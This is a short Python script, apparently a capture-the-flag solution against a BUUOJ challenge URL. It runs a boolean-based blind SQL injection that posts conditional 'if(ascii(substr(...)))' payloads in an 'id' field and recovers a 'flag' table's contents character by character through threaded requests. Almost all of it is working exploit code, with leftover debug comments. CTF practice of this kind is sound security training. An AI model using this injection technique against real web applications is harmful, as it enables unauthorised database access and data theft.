import requests
from concurrent.futures import ProcessPoolExecutor, ThreadPoolExecutor

url = "http://e80b35a9-1dbe-4e49-97f8-0bf421c985f7.node3.buuoj.cn/index.php"
payload = {
    "id":""
}
sql="if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)"
# print()
truesql="if(ascii(substr('a',1,1))=97,1,2)"
payload["id"]=truesql
r = requests.post(url,data=payload)
a=r.text
# print(a)

def req(i,j):
    # print("11111111")
    payload["id"]=sql%(i,j)
    r = requests.post(url,data=payload)
    if(a==r.text):
        # print(payload["id"])
        # print(j)
        print(i,chr(j),end="")
    # else:
        # print(a)
# def a(i,j):
#     print("1111")
# with ThreadPoolExecutor(max_workers=8) as executor:
    # args=(1,2)
    # task2 = executor.submit(lambda p: a(*p),args)
    # a(args)
    # executor.submit(a,((1,2),2))
    # print(f"task1: {task2.done()}")

for i in range(0,50):
    for j in range(1,128):
        with ThreadPoolExecutor(max_workers=8) as executor:
            executor.submit(lambda x:req(*x),(i,j))
        
# substr(select(flag)from(flag)